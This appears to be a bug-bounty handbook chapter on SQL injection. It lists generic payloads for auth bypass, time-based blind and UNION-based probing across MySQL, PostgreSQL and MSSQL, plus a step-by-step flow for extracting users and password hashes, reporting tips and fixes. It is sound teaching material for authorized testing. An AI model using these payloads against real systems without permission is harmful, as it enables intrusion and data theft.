# Chapter 11 – SQL Injection

## Mental Model

User input ends up in a SQL query without proper parameterization.  
Goal: turn **data into code** (modify WHERE, UNION in extra rows, read other tables).

Typical sinks:

- Login endpoints (`/login`, `/auth`, `/session`)
- Search and filter parameters
- Sorting / pagination (`order`, `sort`, `page`)
- Admin-only views that take IDs

## Quick Recon Checklist

- Fuzz IDs with:
  - `1'`
  - `1"` 
  - `1))`
  - `1 OR 1=1`
- Watch for:
  - Verbose SQL errors
  - Time delays on payloads like `SLEEP(5)` or `pg_sleep(5)`
  - Different row counts (auth bypass, list length changes)
- Try both:
  - Query params: `?id=1`
  - Body: JSON fields, form fields
  - Hidden inputs or headers (X-User-Id, X-Tenant-Id)

## Useful Payload Patterns (by DB flavor)

You usually don’t know the DB at first; start generic, then adapt.

### Generic

- Boolean-based:  
  - `1 OR 1=1`
  - `1 OR 1=2`
- Comment styles:
  - `-- -`
  - `/*`
  - `#` (MySQL)

### MySQL-style

- Auth bypass:  
  - `' OR 1=1 -- -`
- Time-based blind:  
  - `1' AND SLEEP(5) -- -`
- Union probe:  
  - `' UNION SELECT NULL -- -`
  - `' UNION SELECT NULL,NULL -- -`

### PostgreSQL-style

- Time-based blind:  
  - `1' AND pg_sleep(5)--`
- Int-based:  
  - `1; SELECT pg_sleep(5)--`

### MSSQL-style

- Time-based blind:  
  - `1; WAITFOR DELAY '0:0:5' --`

## Exploitation Flow

1. **Confirm injectable parameter**
   - Error-based: SQL error appears with `'`/`"`.
   - Boolean-based: response changes for `AND 1=1` vs `AND 1=2`.
   - Time-based: stable delay with `SLEEP/pg_sleep/WAITFOR`.

2. **Identify number of columns**
   - `' ORDER BY 1--`
   - `' ORDER BY 5--` → when it errors, you’ve passed the column count.
   - Or use `UNION SELECT NULL,...` until no error.

3. **Find a “displayed” column**
   - `UNION SELECT 1,2,3,...`
   - See which value appears in the response → use that to leak data.

4. **Extract useful data**
   - Users table, emails, password hashes
   - DB version, current user
   - Tenants / organizations

## Automation Ideas

- Small script that:
  - Sends a baseline request
  - Injects `AND 1=2`, `AND 1=1`, and a sleep payload
  - Compares response length + timing
- Use sqlmap only **after** you have:
  - Legal permission (program rules)
  - A confirmed, stable SQLi

## Reporting Tips

- Clearly state:
  - Vulnerable endpoint + parameter
  - Type: error-based, boolean-based, time-based blind, UNION-based
- Show **impact**, not just payload:
  - “Leaked hashed passwords for all users”
  - “Bypassed login without valid credentials”
- Include:
  - Step-by-step PoC
  - Sanitized sample output (no real passwords in report if you can avoid it)
- Recommended fixes:
  - Parameterized queries / prepared statements
  - ORM query builders, no dynamic string concatenation
  - Central input validation and least-privileged DB accounts

## Common Mistakes (to avoid)

- Testing only GET params, ignoring JSON / headers
- Stopping at auth bypass and never checking for data exfiltration
- Using dangerous tools aggressively before confirming program scope
